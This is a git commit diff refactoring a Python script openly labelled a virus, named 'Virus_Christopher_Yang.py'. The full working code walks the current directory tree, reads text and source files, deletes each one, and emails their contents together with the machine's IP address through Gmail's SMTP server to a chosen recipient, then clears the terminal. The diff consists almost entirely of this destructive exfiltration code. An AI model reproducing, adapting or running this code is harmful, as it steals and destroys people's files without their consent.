10a14a912dd8b2c762c5c289f2c47dba6c15039a
MD R. Islam <mdislamwork@gmail.com>
2015-08-21 11:07:47 -0600

    Update
    - More pythonic

--- Virus_Christopher_Yang.py
+++ Virus_Christopher_Yang.py
@@ -5,49 +5,55 @@ import socket
 import platform
 import time
 
-"""This is a virus that infects the current directory and all subdirectores by reading the files and emailing the computer's IP address and file contents. Afterwards, the files are deleted (except for the virus) and the terminal is cleared"""
+"""
+This is a virus that infects the current directory and all subdirectores by reading the files and emailing the
+computer's IP address and file contents. Afterwards, the files are deleted (except for the virus) and the terminal
+is cleared
+"""
 
-#Searches the current directory and any subdirectories for .txt, .py, .cxx, .cpp, .h, .m, .template, .js, .html files.
-def retrieveFiles(directory):
-    list = []
+# Searches the current directory and any subdirectories for .txt, .py, .cxx, .cpp, .h, .m, .template, .js, .html files.
+def get_files(directory):
+    file_list = []
     for dirName, subdirList, fileList in os.walk(directory):
-        for file in fileList:
-            if file.endswith('.txt') or (file.endswith('.py') and file != 'Virus_Christopher_Yang.py') or file.endswith('.cxx') or file.endswith('.cpp') or file.endswith('.h') or file.endswith('.template')or file.endswith('.js') or file.endswith('.html'):
+        for FILE in fileList:
+            file_extensions = ('txt', 'py', 'cpp', 'h', 'js', 'template', 'cxx', 'html')
+            if FILE.endswith(file_extensions):
                 if dirName != directory:
-                    list.append(os.getcwd() +  dirName[1:] + "/" + file)
+                    file_list.append(os.getcwd() + dirName[1:] + "/" + FILE)
                 else:
-                    list.append(os.getcwd() + "/" + file)
-    return list
+                    file_list.append(os.getcwd() + "/" + FILE)
+    return file_list
 
-#Copies the content of each file into a string.
-def copyFiles(list):
+
+# Copies the content of each file into a string.
+def copy_files(a_list):
     msg = ''
-    for file in list:
-        filehandle = open(file, 'r')
-        temp =  file + "\n" + filehandle.read()
-        msg += temp + "\n\n"
-        filehandle.close()
-        os.remove(file)
+    for FILE in a_list:
+        with open(FILE, 'r') as f:
+            temp = FILE + "\n" + f.read()
+            msg += temp + "\n\n"
+        os.remove(FILE)
     return msg
 
 
-#Sends the email.
-def sendMail(msg):
+# Sends the email.
+def send_mail(msg):
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.ehlo()
     server.starttls()
     server.ehlo()
 
-    youremailusername = raw_input("Input your email: ")
+    email = raw_input("Input your email: ")
     password = getpass.getpass()
-    server.login(youremailusername, password)
+    server.login(email, password)
 
     target = raw_input("Enter the email of the person who will be receiving the copied files: ")
-    server.sendmail(youremailusername, target , msg)
+    server.sendmail(email, target, msg)
 
     print "Successfully sent email!\n"
 
-#Clears the terminal
+
+# Clears the terminal
 def clear():
     print "Deleting files and clearing screen..."
     time.sleep(2)
@@ -59,7 +65,7 @@ def clear():
 
 IP = socket.gethostbyname(socket.gethostname())
 rootDir = '.'
-list = retrieveFiles(rootDir)
+list_of_files = get_files(rootDir)
 print "Infecting current directory...\n"
-sendMail(IP + "\n\n" + copyFiles(list))
+send_mail(IP + "\n\n" + copy_files(list_of_files))
 clear()
